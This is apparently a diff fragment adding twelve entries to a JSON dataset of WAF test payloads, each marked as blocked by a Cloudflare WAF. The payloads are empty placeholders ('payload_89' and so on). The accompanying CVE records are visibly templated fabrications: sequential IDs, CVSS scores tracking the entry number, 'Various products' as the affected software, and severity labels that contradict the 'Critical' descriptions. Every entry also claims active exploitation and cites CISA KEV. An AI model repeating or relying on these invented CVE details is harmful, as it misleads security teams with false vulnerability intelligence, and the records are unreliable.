+      "subcategory": "cve_various_89",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_89\"}",
+      "description": "CVE-2024-10089: Critical vulnerability 89 - CVSS 9.9, actively exploited",
+      "cve": "CVE-2024-10089",
+      "severity": "high",
+      "cvss": "9.9",
+      "affected_versions": "Various products < version 89.0",
+      "disclosure_date": "2024-06-06",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-090",
+      "category": "rce",
+      "subcategory": "cve_various_90",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_90\"}",
+      "description": "CVE-2020-10090: Critical vulnerability 90 - CVSS 9.0, actively exploited",
+      "cve": "CVE-2020-10090",
+      "severity": "critical",
+      "cvss": "9.0",
+      "affected_versions": "Various products < version 90.0",
+      "disclosure_date": "2020-07-07",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-091",
+      "category": "rce",
+      "subcategory": "cve_various_91",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_91\"}",
+      "description": "CVE-2021-10091: Critical vulnerability 91 - CVSS 9.1, actively exploited",
+      "cve": "CVE-2021-10091",
+      "severity": "high",
+      "cvss": "9.1",
+      "affected_versions": "Various products < version 91.0",
+      "disclosure_date": "2021-08-08",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-092",
+      "category": "rce",
+      "subcategory": "cve_various_92",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_92\"}",
+      "description": "CVE-2022-10092: Critical vulnerability 92 - CVSS 9.2, actively exploited",
+      "cve": "CVE-2022-10092",
+      "severity": "critical",
+      "cvss": "9.2",
+      "affected_versions": "Various products < version 92.0",
+      "disclosure_date": "2022-09-09",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-093",
+      "category": "rce",
+      "subcategory": "cve_various_93",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_93\"}",
+      "description": "CVE-2023-10093: Critical vulnerability 93 - CVSS 9.3, actively exploited",
+      "cve": "CVE-2023-10093",
+      "severity": "high",
+      "cvss": "9.3",
+      "affected_versions": "Various products < version 93.0",
+      "disclosure_date": "2023-10-10",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-094",
+      "category": "rce",
+      "subcategory": "cve_various_94",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_94\"}",
+      "description": "CVE-2024-10094: Critical vulnerability 94 - CVSS 9.4, actively exploited",
+      "cve": "CVE-2024-10094",
+      "severity": "critical",
+      "cvss": "9.4",
+      "affected_versions": "Various products < version 94.0",
+      "disclosure_date": "2024-11-11",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-095",
+      "category": "rce",
+      "subcategory": "cve_various_95",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_95\"}",
+      "description": "CVE-2020-10095: Critical vulnerability 95 - CVSS 9.5, actively exploited",
+      "cve": "CVE-2020-10095",
+      "severity": "high",
+      "cvss": "9.5",
+      "affected_versions": "Various products < version 95.0",
+      "disclosure_date": "2020-12-12",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-096",
+      "category": "rce",
+      "subcategory": "cve_various_96",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_96\"}",
+      "description": "CVE-2021-10096: Critical vulnerability 96 - CVSS 9.6, actively exploited",
+      "cve": "CVE-2021-10096",
+      "severity": "critical",
+      "cvss": "9.6",
+      "affected_versions": "Various products < version 96.0",
+      "disclosure_date": "2021-01-13",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-097",
+      "category": "rce",
+      "subcategory": "cve_various_97",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_97\"}",
+      "description": "CVE-2022-10097: Critical vulnerability 97 - CVSS 9.7, actively exploited",
+      "cve": "CVE-2022-10097",
+      "severity": "high",
+      "cvss": "9.7",
+      "affected_versions": "Various products < version 97.0",
+      "disclosure_date": "2022-02-14",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-098",
+      "category": "rce",
+      "subcategory": "cve_various_98",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_98\"}",
+      "description": "CVE-2023-10098: Critical vulnerability 98 - CVSS 9.8, actively exploited",
+      "cve": "CVE-2023-10098",
+      "severity": "critical",
+      "cvss": "9.8",
+      "affected_versions": "Various products < version 98.0",
+      "disclosure_date": "2023-03-15",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-099",
+      "category": "rce",
+      "subcategory": "cve_various_99",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_99\"}",
+      "description": "CVE-2024-10099: Critical vulnerability 99 - CVSS 9.9, actively exploited",
+      "cve": "CVE-2024-10099",
+      "severity": "high",
+      "cvss": "9.9",
+      "affected_versions": "Various products < version 99.0",
+      "disclosure_date": "2024-04-16",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "cve-add-100",
+      "category": "rce",
+      "subcategory": "cve_various_100",
+      "payload": "POST /api/endpoint HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"exploit\":\"payload_100\"}",
+      "description": "CVE-2020-10100: Critical vulnerability 100 - CVSS 9.0, actively exploited",
+      "cve": "CVE-2020-10100",
+      "severity": "critical",
+      "cvss": "9.0",
+      "affected_versions": "Various products < version 100.0",
+      "disclosure_date": "2020-05-17",
+      "source": "CISA KEV, Vendor Security Advisory",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
